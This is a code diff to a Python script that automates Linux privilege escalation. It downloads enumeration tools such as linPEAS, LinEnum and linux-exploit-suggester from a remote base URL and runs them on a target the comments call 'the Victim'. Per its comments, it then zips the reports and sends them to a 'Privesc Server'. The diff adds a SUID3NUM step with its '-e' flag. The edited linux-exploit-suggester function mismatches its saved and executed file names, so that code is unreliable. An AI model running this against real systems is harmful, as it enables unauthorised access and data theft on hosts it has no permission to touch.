@@ -70,6 +70,7 @@ def LinCheck(cmd, url, output_file, input_file):
     # Download & run the tools
     # write the output to file
     # Remove the tool form the Victim
+
     req = requests.get(url)
     if req.status_code == 200:
         file = open(input_file, 'wb')
@@ -98,6 +99,7 @@ def edit_and_send(directory, mode):
     # Merge all the output files to one big report
     # Sort the the final report and remove duplicate (Some duplicate lines because the output of the original tool)
     # Zip the folder with all the reports and send it to the Privesc Server with PUT method and cleans al the files
+
     read_files = glob.glob("*.txt")
     base_name = directory + '-' + mode
     with open("result.txt", "wb") as outfile:
@@ -142,9 +144,9 @@ All The Tools in This Script
 '''
 def linPEAS(base_url):
     # linPEAS
-    # Last Update: 18/08/2020
     # Github: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
     # Author: carlospolop
+
     linPAES = "./linpeas.sh"
     linPEAS_url = base_url + "linpeas.sh"
     print('\n[+] Running linPEAS Scan ')
@@ -153,10 +155,10 @@ def linPEAS(base_url):
 
 
 def LinEnum(base_url):
-    # LinEnum.
-    # Last Update: 18/08/2020
+    # LinEnum
     # Github: https://github.com/rebootuser/LinEnum
     # Author: rebootuser
+
     LinEnum = "./LinEnum.sh"
     LinEnum_url = base_url + "LinEnum.sh"
     print('\n[+] Running LinEnum Scan ')
@@ -166,9 +168,9 @@ def LinEnum(base_url):
 
 def PE(base_url):
     # PE-Linux
-    # Last Update: 18/08/2020
     # Github: https://github.com/WazeHell/PE-Linux
     # Author: WazeHell
+
     PE = "./PE.sh"
     PE_url = base_url + "PE.sh"
     print('\n[+] Running PE-Linux Scan ')
@@ -178,9 +180,9 @@ def PE(base_url):
 
 def lse(base_url):
     # Linux-Smart-Enumeration
-    # Last Update: 18/08/2020
     # Github: https://github.com/diego-treitos/linux-smart-enumeration
     # Author: diego-treitos
+
     lse = "./lse.sh -l2 -i -s pro,usr,sud,fst,sys,sec,ret,net,srv,sof,ctn -p 10"
     lse_url = base_url + "lse.sh"
     print('\n[+] Running Linux-Smart-Enumeration  Scan ')
@@ -190,21 +192,21 @@ def lse(base_url):
 
 def les(base_url):
     # linux-exploit-suggester
-    # Last Update: 18/08/2020
     # Github: https://github.com/mzet-/linux-exploit-suggester
     # Author: mzet
-    les = "./les.sh --checksec && ./les.sh"
-    les_url = base_url + "les.sh"
+
+    les = "./linux-exploit-suggester.sh --checksec && ./les.sh"
+    les_url = base_url + "linux-exploit-suggester.sh"
     print('\n[+] Running linux-exploit-suggester  Scan ')
-    LinCheck(cmd=les, url=les_url, output_file="linux-exploit-suggester.txt", input_file="les.sh")
+    LinCheck(cmd=les, url=les_url, output_file="linux-exploit-suggester.txt", input_file="linux-exploit_suggester.sh")
     print('[$] Done linux-exploit-suggester Scan.\n')
 
 
 def linux_security_test(base_url):
-    # linux-exploit-suggester
-    # Last Update: 18/08/2020
+    # linux_security_test
     # Github: https://github.com/1N3/PrivEsc/tree/master/linux/scripts
     # Author: 1N3@CrowdShield
+
     linux_security_test = "./linux_security_test detailed  |grep WARNING"
     linux_security_test_url = base_url + "linux_security_test"
     print('\n[+] Running linux_security_test Scan.\n ')
@@ -215,9 +217,9 @@ def linux_security_test(base_url):
 
 def linux_privesc(base_url):
     # linux_privesc
-    # Last Update: 18/08/2020
     # Author: 1N3@CrowdShield
     # Github: https://github.com/1N3/PrivEsc/tree/master/linux/scripts
+
     linux_privesc = "./linux_privesc.sh"
     linux_privesc_url = base_url + "linux_privesc.sh"
     print('\n[+] Running linux_privesc Scan.\n ')
@@ -227,15 +229,28 @@ def linux_privesc(base_url):
 
 def linux_checksec(base_url):
     # linux_checksec
-    # Last Update: 18/08/2020
     # Github: https://github.com/1N3/PrivEsc/tree/master/linux/scripts
     # Author: 1N3@CrowdShield
+
     linux_checksec = './linux_checksec.sh --kernel &&./linux_checksec.sh --proc-all'
     linux_checksec_url = base_url + 'linux_checksec.sh'
     print('\n[+] Running linux_checksec Scan.\n ')
     LinCheck(cmd=linux_checksec, url=linux_checksec_url, output_file="linux_checksec.txt",
              input_file="linux_checksec.sh")
     print('\n[+] Done linux_checksec Scan.\n ')
+
+def SUID3NUM(base_url):
+    # SUID3NUM
+    # Github: https://github.com/Anon-Exploiter/SUID3NUM
+    # Author: Anon-Exploiter
+
+    suid3num = 'python3 suid3num.py -e'
+    suid3num_url = base_url + 'suid3num.py'
+    print('\n[+] Running SUID3NUM Scan.\n ')
+    LinCheck(cmd=suid3num, url=suid3num_url, output_file="SUID3NUM.txt",
+             input_file="suid3num.py")
+    print('\n[+] Done SUID3NUM Scan.\n ')
+
 
 
 def user_choice(mode):
